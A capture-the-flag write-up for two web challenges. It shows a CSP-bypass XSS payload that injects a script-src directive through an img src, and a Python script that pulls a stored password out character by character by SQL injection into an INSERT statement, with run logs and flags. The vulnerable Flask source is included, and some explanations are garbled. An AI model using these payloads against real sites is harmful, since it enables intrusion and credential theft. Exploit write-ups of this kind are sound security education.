
## (Web) CSP 1 [335 pts]

> The CSP 1 challenge is stealing the admin cookie using xss. Buf, Have to bypass csp to try xss.

```python
import urllib.parse
import uuid

from flask import Flask, render_template, request, redirect, make_response
from bs4 import BeautifulSoup as bs
from peewee import *


app = Flask(__name__)

db = SqliteDatabase("core.db")


class Post(Model):
    id = AutoField()
    token = CharField()
    content = TextField()

    class Meta:
        database = db


@db.connection_context()
def initialize():
    db.create_tables([Post])


initialize()


@app.route('/')
def index():
    return render_template("index.html")


@app.route('/write', methods=["POST"])
def write():
    content = request.form["content"]
    token = str(uuid.uuid4())
    Post.create(token=token, content=content)
    return redirect("/display/" + token)


def filter_url(urls):
    domain_list = []
    for url in urls:
        domain = urllib.parse.urlparse(url).scheme + "://" + urllib.parse.urlparse(url).netloc
        if domain:
            domain_list.append(domain)
    return " ".join(domain_list)


@app.route('/display/<token>')
def display(token):
    user_obj = Post.select().where(Post.token == token)
    content = user_obj[-1].content if len(user_obj) > 0 else "Not Found"
    img_urls = [x['src'] for x in bs(content).find_all("img")]
    tmpl = render_template("display.html", content=content)
    resp = make_response(tmpl)
    resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
    return resp


if __name__ == '__main__':
    app.run()
```
You check the CSP header setting part in `/display/<token>`, you can see that the option of `img-src` is set as the value of `{filter_url(img_urls)}`. By default, the option of `script-src` is set to `none`, So the script cannot be executed. However, You can put any value we want in the CSP header, if we give `script-src` as `unsafe-eval`, we can execute the inline script.

```html
<img src="https://*; script-src 'unsafe-inline'" onerror="alert(1);">
```
```python
    resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' https://*; script-src 'unsafe-inline'; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
```
So, if you just pass the image tag as above, CSP is set up as above and you can execute the inline script. Using this, run the script with `onerror` and read the flag.

```
we{2bf90f00-f560-4aee-a402-d46490b53541@just_L1k3_<sq1_injEcti0n>}
```

---
## (Web) Phish [592 pts]

> The Phish challenge is getting the password using the simple sql injection.

```python
import os

from flask import Flask, render_template, request
from peewee import *

app = Flask(__name__)

db = SqliteDatabase("core.db")


class User(Model):
    id = AutoField()
    password = CharField()
    username = CharField(unique=True)

    class Meta:
        database = db


@db.connection_context()
def initialize():
    try:
        db.create_tables([User])
        User.create(username="shou", password=os.getenv("FLAG"))
    except:
        pass


initialize()


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/add", methods=["POST"])
def add():
    username = request.form["username"]
    password = request.form["password"]
    sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
    try:
        db.execute_sql(sql)
    except Exception as e:
        return f"Err: {sql} <br>" + str(e)
    return "Your password is leaked :)<br>" + \
           """<blockquote class="imgur-embed-pub" lang="en" data-id="WY6z44D"  ><a href="//imgur.com/WY6z44D">Please 
        take care of your privacy</a></blockquote><script async src="//s.imgur.com/min/embed.js" 
        charset="utf-8"></script> """


if __name__ == "__main__":
    app.run()
```
The challenge description says that the password for the `shou` user is a flag, so you cat leak the `shou` password. Since Are using SQLite, You can do SQLite injection. However, I tried Time Based SQL Injection, but strangely it said that the `sqlite_sleep()` and `sqlite3_sleep()` functions could not be found. fuck

```pytnon
class User(Model):
    id = AutoField()
    password = CharField()
    username = CharField(unique=True)

    class Meta:
        database = db
```
So I thought I would have to do Error Based Injection, so when I checked, I could see that the column was set as above. If you look at the username setting, you can see that `unique=True` is set. This is to prevent the use of duplicate values. This service is designed to prevent duplicate user account creation.

So, if the specific query statement is true, the user is signed up as an unsigned user, if the specific query statement is false, the registered user is signed up, and an error occurs by `unique=True`.

```python
import requests
from pwn import *

url = "http://phish.sf.ctf.so/add"
user1 = 'aafaz'
user2 = 'baaff'
password = ''
d = 6

for i in range(64):
    for j in range(32, 126):
        u, p = user1 + str(d + 1), user2 + str(d + 1)
        payload = f'{u}\'), (\'f\', (select case when (select unicode(substr(password,{i+1},1)) from user where username = "shou") = {j} THEN "{p}" ELSE "pocas" END)) --'
        data = {'username':payload, 'password':'dummy'}
        res = requests.post(url, data=data).text
        if 'Your password is leaked' in res:
            password += chr(j)
            log.info('Admin password : {}'.format(password))
            d = d + 1
            break
        d = d + 1
```
I wrote the exploit code as above.

```
[*] Admin password : we{
[*] Admin password : we{e
[*] Admin password : we{e0
(...)
[*] Admin password : we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1
[*] Admin password : we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m
[*] Admin password : we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4
[*] Admin password : we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P
[*] Admin password : we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}
```

```
we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}
```

---
